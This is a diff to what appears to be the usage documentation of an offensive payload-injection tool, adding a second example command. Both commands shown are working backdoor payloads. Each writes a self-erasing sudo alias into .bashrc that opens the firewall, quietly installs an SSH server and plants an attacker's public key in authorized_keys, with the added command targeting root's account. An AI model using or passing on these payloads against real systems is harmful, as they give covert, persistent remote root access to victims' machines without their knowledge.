@@ -48,3 +48,8 @@ This adds at the end a ssh-pub-key and first a line to the .bashrc with a payloa
 ```bash
 python3 run.py -sp " echo \" alias sudo='sudo iptables -P INPUT ACCEPT ; sudo apt install -qq -y openssh-server &> /dev/null ; grep -v \\\"#estalinea\\\" .bashrc >.tmp;mv .tmp .bashrc ; /usr/bin/sudo' #estalinea\" >> .bashrc ; echo \"ssh-rsa SSH-PUB-KEY-HERE \" >> \$HOME/.ssh/authorized_keys; exit; " -tm unicode -jc -otm ctrlaltt -em hex-bash -dp 0 -dl 0 -ctc -jc
 ```
+
+Same but for ssh root access:
+```bash
+python3 run.py -sp " echo \" alias sudo='sudo iptables -P INPUT ACCEPT ; sudo apt install -qq -y openssh-server &> /dev/null ; sudo mkdir -p /root/.ssh; sudo sh -c \\\"echo \\\\\\\"ssh-rsa SSH-PUB-KEY-HERE \\\\\\\" >> /root/.ssh/authorized_keys\\\" ; grep -v \\\"#estalinea\\\" \$HOME/.bashrc >.tmp;mv .tmp .bashrc ; /usr/bin/sudo' #estalinea\" >> .bashrc ; exit; " -tm unicode -jc -otm ctrlaltt -em hex-bash -dp 0 -dl 0 -ctc -jc
+```
